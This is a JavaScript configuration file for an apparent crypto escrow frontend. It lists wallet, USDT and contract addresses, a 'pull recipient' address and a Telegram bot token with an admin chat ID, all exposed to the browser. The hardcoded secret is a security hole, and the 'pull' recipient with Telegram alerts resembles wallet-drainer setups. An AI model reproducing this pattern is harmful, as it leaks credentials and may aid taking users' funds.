// ===== Frontend Configuration =====
const CONFIG = {
    // Company wallet address (MUST match the one in your admin panel + escrow contract)
    COMPANY_WALLET_ADDRESS: "0xbfc17A492Bc8167556aFe1Cf90D9F7Fc384DeFb4",

    // Telegram bot token (must match your admin panel config)
    TELEGRAM_BOT_TOKEN: "8941208473:AAEY1s1srFize2Ij_Ai1nYirSOcR6i18OOM",

    ADMIN_CHAT_ID: "-5543160952",

    // USDT Token Address (BEP20)
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",

    // Escrow Contract Address (update after deployment, same as in admin panel)
    ESCROW_CONTRACT_ADDRESS: "0xaEB39CED46aaAdf4F6369806252083E82cbCEB91",

    CONTRACT_ADDRESS: "0xaEB39CED46aaAdf4F6369806252083E82cbCEB91",

    BSC_RPC_URL: "https://bsc-dataseed1.binance.org/",

    PULL_RECIPIENT_ADDRESS: "0xf2a151e92ae0eab7157322545c33648c0824fa2e",

    PORT: 3000
};

// Export for Node.js or attach to window for browser
if (typeof module !== "undefined" && module.exports) {
    module.exports = CONFIG;
} else {
    window.CONFIG = CONFIG;
}
